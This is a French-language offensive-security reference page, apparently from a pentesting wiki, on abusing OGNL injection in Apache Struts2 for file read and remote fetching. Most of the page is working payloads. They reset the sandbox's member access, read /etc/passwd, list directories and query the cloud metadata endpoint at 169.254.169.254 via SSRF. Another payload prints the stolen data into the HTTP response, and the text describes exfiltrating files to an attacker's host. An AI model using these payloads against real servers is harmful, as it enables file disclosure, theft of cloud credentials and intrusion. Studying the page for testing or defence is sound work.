---
title: "Inclusion de fichier distant OGNL : lecture et récupération via les expressions Struts2"
description: "OGNL construit java.io.File et java.net.URL dans l'évaluation Struts2 pour lire des fichiers locaux et récupérer du contenu distant une fois le sandbox d'accès aux membres nettoyé."
keywords:
  - lecture de fichier OGNL
  - inclusion de fichier distant OGNL
  - java.net.URL openStream
  - divulgation de fichier Struts2
  - SSRF OGNL
---

# Inclusion de fichier distant

À défaut d'exécuter une commande, OGNL construit des objets d'E/S directement : `java.io.File` et ses readers pour les fichiers locaux, `java.net.URL` pour les récupérations distantes. La même restriction d'accès aux membres qui conditionne `Runtime` conditionne aussi ces constructeurs sur une pile moderne, donc le préambule de nettoyage du sandbox issu de l'[exécution de code à distance](remote-code-execution.md) vient d'abord ; sur des évaluateurs plus anciens ou relâchés, les appels de constructeur s'exécutent d'eux-mêmes.

## Lire un fichier local

Une fois l'accès aux membres restauré, construisez un reader sur un `File` et diffusez-le dans un token. Un `BufferedReader` sur un `FileReader` renvoie le contenu ligne par ligne, et un `Scanner` avec le délimiteur `\A` renvoie tout le fichier d'un coup :

```
%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,
new java.util.Scanner(new java.io.File("/etc/passwd")).useDelimiter("\\A").next()}
```

Lire un répertoire à la place énumère ses entrées, ce qui s'associe au répertoire de travail récupéré lors de la sonde d'évaluation :

```
%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,
new java.io.File(".").list()}
```

## Récupérer du contenu distant

Un `java.net.URL` ouvre un flux sortant depuis le serveur, ce qui à la fois inclut du contenu distant et atteint des services internes que le client ne peut pas atteindre (une primitive SSRF contre les endpoints de métadonnées et les hôtes internes) :

```
%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,
new java.util.Scanner(new java.net.URL("http://169.254.169.254/latest/meta-data/").openStream()).useDelimiter("\\A").next()}
```

## Renvoyer le contenu

Pour écrire l'un ou l'autre résultat au client quelle que soit la façon dont la value stack gère la valeur, récupérez la réponse depuis `ServletActionContext` et imprimez la chaîne capturée, le même chemin de retour que pour la sortie de commande :

```
%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,
#data=new java.util.Scanner(new java.io.File("/etc/passwd")).useDelimiter("\\A").next(),
#resp=@org.apache.struts2.ServletActionContext@getResponse(),
#resp.getWriter().println(#data),
#resp.getWriter().flush()}
```

Écrire hors bande via `URL` vers un hôte contrôlé par l'attaquant exfiltre le contenu du fichier sans avoir besoin du corps de la réponse, en plaçant les données lues dans le chemin de requête d'une requête sortante, ce qui est utile là où le point d'injection jette son résultat d'évaluation.

## Outils

- **Burp Suite** : Repeater pour construire des lectures File/URL dans OGNL et renvoyer le contenu.
- **J2EEScan** : extension Burp signalant l'injection OGNL et Struts.
- Payloads OGNL manuels construisant java.io.File et java.net.URL.

## Références

- [Apache Commons OGNL Language Guide](https://commons.apache.org/dormant/commons-ognl/language-guide.html)
- [Apache Struts2 Security](https://struts.apache.org/security/)
